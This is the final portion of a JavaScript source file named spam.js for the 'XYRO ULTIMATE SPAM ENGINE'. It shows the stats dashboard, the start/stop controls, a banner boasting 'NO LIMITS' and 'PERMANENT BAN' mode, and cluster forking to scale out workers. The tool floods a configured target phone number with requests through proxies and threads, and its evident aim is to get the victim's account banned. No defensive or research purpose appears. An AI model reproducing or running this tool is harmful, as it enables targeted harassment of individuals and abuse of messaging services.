    this.log(`📊 Success: ${this.stats.success}`, 'success');
    this.log(`📊 Failed: ${this.stats.fail}`, 'error');
    this.log(`📊 Rate: ${this.stats.rps.toFixed(2)} req/s`, 'info');
    this.log(`📊 Success Rate: ${this.stats.successRate.toFixed(2)}%`, 'info');
    this.log(`📊 Total Time: ${moment.duration(totalTime).humanize()}`, 'info');
    this.log(`📊 Ban Status: ${this.stats.banFlagged ? '🚨 ACTIVE' : '⏳ WAITING'}`, this.stats.banFlagged ? 'ban' : 'info');
    
    this.emit('complete', this.stats);
  }
  
  // ================================================================
  // ===== STATISTICS REPORTING =====
  // ================================================================
  
  startStatsReporting() {
    if (this.statsInterval) {
      clearInterval(this.statsInterval);
    }
    
    this.statsInterval = setInterval(() => {
      if (!this.isRunning) return;
      
      const rps = this.stats.rps || 0;
      const successRate = this.stats.total > 0 
        ? (this.stats.success / this.stats.total * 100).toFixed(1) 
        : 0;
      
      // Create stats table
      const table = new Table({
        head: ['Metric', 'Value'],
        colWidths: [20, 30]
      });
      
      table.push(
        ['Total Requests', this.stats.total],
        ['Success', chalk.green(this.stats.success)],
        ['Failed', chalk.red(this.stats.fail)],
        ['RPS', chalk.cyan(rps.toFixed(2))],
        ['Success Rate', chalk.yellow(successRate + '%')],
        ['Ban Flagged', chalk.bgRed.white(this.stats.banFlagged ? 'YES' : 'NO')],
        ['Active Threads', this.stats.activeThreads],
        ['Uptime', moment.duration(Date.now() - this.stats.startTime).humanize()],
        ['Endpoint Usage', Object.entries(this.stats.endpointsUsed)
          .sort((a, b) => b[1] - a[1])
          .slice(0, 3)
          .map(([k, v]) => `${k}: ${v}`)
          .join(', ')]
      );
      
      // Clear previous stats if in console
      if (this.config.logging.console) {
        // Write to stderr to not mess up progress bar
        process.stderr.write('\x1B[2J\x1B[0f');
        console.log(chalk.cyan('=' .repeat(60)));
        console.log(chalk.bold.white('📊 XYRO SPAM ENGINE STATS'));
        console.log(chalk.cyan('=' .repeat(60)));
        console.log(table.toString());
        console.log(chalk.cyan('=' .repeat(60)));
        console.log(chalk.gray(`[W${this.workerId}] ${moment().format('YYYY-MM-DD HH:mm:ss')}`));
        console.log(chalk.gray('Press Ctrl+C to stop'));
      }
      
    }, 2000);
  }
  
  // ================================================================
  // ===== CONTROL METHODS =====
  // ================================================================
  
  async start() {
    if (this.isRunning) {
      this.log('Engine already running', 'warn');
      return;
    }
    
    this.isRunning = true;
    this.isPaused = false;
    this.stats.startTime = Date.now();
    
    this.log('🔥 Starting spam engine...', 'info');
    this.log(`📍 Target: ${this.config.target.phoneNumber}`, 'info');
    this.log(`⚡ Threads: ${this.config.threads.max}`, 'info');
    this.log(`🔥 Mode: ${this.config.banTrigger.permanentBan ? 'PERMANENT BAN' : 'TEMPORARY'}`, 'info');
    this.log(`🌐 Proxy: ${this.config.proxy.enabled ? 'ENABLED' : 'DISABLED'}`, 'info');
    
    // Start spamming
    await this.spamLoop();
  }
  
  pause() {
    this.isPaused = true;
    this.log('⏸️ Engine paused', 'warn');
  }
  
  resume() {
    this.isPaused = false;
    this.log('▶️ Engine resumed', 'info');
  }
  
  stop() {
    this.isRunning = false;
    this.isPaused = false;
    
    // Clean up
    for (const ws of this.wsConnections) {
      try {
        ws.close();
      } catch (e) {}
    }
    this.wsConnections = [];
    
    for (const browser of this.browserPool) {
      try {
        browser.close();
      } catch (e) {}
    }
    this.browserPool = [];
    
    for (const socket of this.socketConnections) {
      try {
        socket.destroy();
      } catch (e) {}
    }
    this.socketConnections = [];
    
    if (this.statsInterval) {
      clearInterval(this.statsInterval);
      this.statsInterval = null;
    }
    
    this.log('🛑 Engine stopped', 'warn');
    this.emit('stopped', this.stats);
  }
  
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  getStats() {
    return {
      ...this.stats,
      isRunning: this.isRunning,
      isPaused: this.isPaused
    };
  }
}

// ================================================================
// ===== MAIN EXECUTION =====
// ================================================================

async function main() {
  console.clear();
  
  // Display banner
  console.log(gradient.passion(figlet.textSync('XYRO', { font: 'Big' })));
  console.log(gradient.retro(figlet.textSync('SPAM ENGINE', { font: 'Small' })));
  
  console.log(boxen(
    `🔥 XYRO ULTIMATE SPAM ENGINE v9.9.9 🔥\n` +
    `╔═══════════════════════════════════════════════════╗\n` +
    `║  STATUS: ${'UNLEASHED'.red} - ${'NO LIMITS'.yellow}             ║\n` +
    `║  MODE: ${'PERMANENT BAN'.bgRed.white} ENGAGED              ║\n` +
    `║  TARGET: ${CONFIG.target.phoneNumber}              ║\n` +
    `║  THREADS: ${CONFIG.threads.max}                           ║\n` +
    `║  REQUESTS: ${CONFIG.requests.total.toLocaleString()}                 ║\n` +
    `║  PROXY: ${CONFIG.proxy.enabled ? 'ENABLED'.green : 'DISABLED'.red}                             ║\n` +
    `╚═══════════════════════════════════════════════════╝`,
    { 
      padding: 1, 
      borderColor: 'red', 
      borderStyle: 'double',
      align: 'center'
    }
  ));
  
  console.log(chalk.gray('\n' + '='.repeat(60)));
  console.log(chalk.gray(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Initializing...`));
  console.log(chalk.gray('='.repeat(60) + '\n'));
  
  // Create and start engine
  const engine = new SpamEngine(CONFIG);
  
  // Handle events
  engine.on('banTriggered', (data) => {
    console.log(chalk.bgRed.white('\n🚨 BAN TRIGGERED!'));
    console.log(chalk.red(`   Target: ${data.target}`));
    console.log(chalk.red(`   Trigger: ${data.trigger}`));
    console.log(chalk.red(`   Success: ${data.stats.success}`));
    console.log(chalk.red(`   Flags: ${data.flags.join(', ')}`));
  });
  
  engine.on('complete', (stats) => {
    console.log(chalk.green('\n✅ SPAM COMPLETED!'));
    console.log(chalk.cyan(`   Success: ${stats.success}`));
    console.log(chalk.cyan(`   Failed: ${stats.fail}`));
    console.log(chalk.cyan(`   Rate: ${stats.rps.toFixed(2)} req/s`));
    console.log(chalk.cyan(`   Success Rate: ${stats.successRate.toFixed(2)}%`));
    console.log(chalk.cyan(`   Ban Flagged: ${stats.banFlagged ? 'YES' : 'NO'}`));
    process.exit(0);
  });
  
  engine.on('stopped', (stats) => {
    console.log(chalk.yellow('\n🛑 ENGINE STOPPED'));
    console.log(chalk.cyan(`   Total: ${stats.total}`));
    console.log(chalk.cyan(`   Success: ${stats.success}`));
    console.log(chalk.cyan(`   Failed: ${stats.fail}`));
    process.exit(0);
  });
  
  // Handle signals
  process.on('SIGINT', () => {
    console.log(chalk.yellow('\n🛑 Received SIGINT, stopping engine...'));
    engine.stop();
    setTimeout(() => {
      process.exit(0);
    }, 2000);
  });
  
  process.on('SIGTERM', () => {
    console.log(chalk.yellow('\n🛑 Received SIGTERM, stopping engine...'));
    engine.stop();
    setTimeout(() => {
      process.exit(0);
    }, 2000);
  });
  
  // Start engine
  await engine.start();
}

// ================================================================
// ===== CLUSTER SUPPORT =====
// ================================================================

if (CONFIG.threads.clusterMode && cluster.isMaster) {
  const numCPUs = os.cpus().length;
  console.log(chalk.cyan(`\n🔥 Starting cluster with ${numCPUs} workers`));
  
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker, code, signal) => {
    console.log(chalk.yellow(`[${worker.id}] Worker died, restarting...`));
    cluster.fork();
  });
  
  cluster.on('message', (worker, message) => {
    if (message.type === 'stats') {
      // Aggregate stats from workers
    }
  });
  
} else if (CONFIG.threads.clusterMode && cluster.isWorker) {
  // Worker mode
  main();
  
} else {
  // Single mode
  main();
}

// ================================================================
// ===== EXPORTS =====
// ================================================================

module.exports = { SpamEngine, CONFIG };

// ================================================================
// ===== END OF SPAM.JS ======
// ================================================================